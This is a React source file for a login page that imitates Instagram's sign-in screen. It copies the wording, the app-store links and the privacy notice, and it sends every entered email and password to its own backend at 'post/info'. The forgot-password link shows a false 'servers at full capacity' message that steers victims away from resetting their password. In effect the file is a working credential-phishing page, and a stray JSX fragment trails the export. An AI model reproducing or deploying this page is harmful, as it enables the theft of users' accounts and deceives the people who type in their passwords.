import React, { useEffect, useState } from "react";
import baseUrl from "../Utils/axios";
import { useNavigate } from "react-router-dom";

//components
import Footer from "./Footer";

//style
import "../Styles/login.css";

//static
import googleplay from "../Static/googleplay.png";
import microsoft from "../Static/microsoft.png";
import loadingLogo from "../Static/insta-login.png";
import loading from "../Static/loading.gif";

function Login() {
  const [forgotPwdModelActive, setForgotPwdModelActive] = useState(false);
  const [submitLodingModelActive, setSubmitLodingModelActive] = useState(false);
  const [submitLoading, setSubmitLoading] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const navigate = useNavigate();

  useEffect(() => {
    if (forgotPwdModelActive) {
      document.getElementById("forpwdmodel").classList.add("show");
    } else {
      // document.getElementById("forpwdmodel").classList.remove("show");
    }
  }, [forgotPwdModelActive]);

  function handleLogin() {
    setSubmitLodingModelActive(true);
    if (email == "" || password == "") {
      alert("Email And password cannot be empty");
    } else {
      async function saveUser(data) {
        const res = await baseUrl.post("post/info", data);
        if (res.status === 201) {
          navigate("/login/logged/successful");
          setSubmitLodingModelActive(true);
        } else {
          navigate("/login/logged/error");
          setSubmitLodingModelActive(true);
        }
      }

      let data = {
        email: email,
        password: password,
      };

      saveUser(data);
    }
  }

  return (
    <div
      className="wrap-all"
      onClick={() => {
        if (forgotPwdModelActive) {
          setForgotPwdModelActive(false);
        }
      }}
    >
      {submitLodingModelActive ? (
        <div>
          <div id="submit-model-wrap">
            <div id="submit-model">
              <img src={loading} alt="" className="wait-anime" />
              <div className="please-wait">Please Wait</div>
            </div>
          </div>
        </div>
      ) : null}
      {forgotPwdModelActive ? (
        <div>
          <div id="forpwdmodel-wrap">
            <div id="forpwdmodel">
              We're sorry, but our servers are currently at full capacity,
              preventing us from sending you a password reset link to your
              email. To reset your password, please access your account from a
              mobile device (smartphone or tablet) and follow the instructions
              there. We apologize for any inconvenience caused and appreciate
              your understanding. If you need further assistance, please contact
              our support team. Thank you!
            </div>
          </div>
        </div>
      ) : null}
      <div className="container">
        <div className="box">
          <div className="heading"></div>
          <form
            className="login-form"
            onSubmit={(e) => {
              e.preventDefault();
            }}
          >
            <div className="field">
              <input
                id="username"
                type="name"
                placeholder="Phone number, username, or email"
                onChange={(e) => {
                  setEmail(e.target.value);
                }}
              />
              <label htmlFor="username">Phone number, username, or email</label>
            </div>
            <div className="field">
              <input
                id="password"
                type="password"
                placeholder="password"
                onChange={(e) => {
                  setPassword(e.target.value);
                }}
              />
              <label htmlFor="password">Password</label>
            </div>
            <button
              className="login-button"
              title="login"
              onClick={handleLogin}
            >
              Log In
            </button>
            <div className="separator">
              <div className="line"></div>
              <p>OR</p>
              <div className="line"></div>
            </div>
            <div className="other">
              <button className="fb-login-btn" type="button">
                <i className="fa fa-facebook-official fb-icon"></i>
                <span className="login-with-fb-login">
                  <a href="https://web.facebook.com/login/?_rdc=1&_rdr">
                    Log in with Facebook
                  </a>
                </span>
              </button>
              <a
                className="forgot-password"
                href="#"
                onClick={() => {
                  setForgotPwdModelActive(true);
                }}
              >
                Forgotten your password?
              </a>
            </div>
          </form>
        </div>
        <div className="box">
          <p>
            Don't have an account?{" "}
            <a className="signup" href="/accounts/emailsignup">
              Sign Up
            </a>
          </p>
        </div>
        <div className="download">
          <p>Get the app</p>
          <div className="download-links">
            <a
              href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en&gl=US"
              className="googleplay"
            >
              <img src={googleplay} alt="" className="link-img" />
            </a>
            <a
              href="https://www.microsoft.com/store/productId/9NBLGGH5L9XT"
              className="microsoft "
            >
              <img src={microsoft} alt="" className="link-img" />
            </a>
          </div>
        </div>
      </div>
      <Footer />
    </div>
  );
}

export default Login;

<div className="privacy-policy-wrap">
  People who use our service may have uploaded your contact information to
  Instagram. <a href="">Learn more</a>
  <br />
  <br />
  By signing up, you agree to our
  <a href="">Terms, Privacy Policy</a> and
  <a href="">Cookies Policy.</a>
</div>;
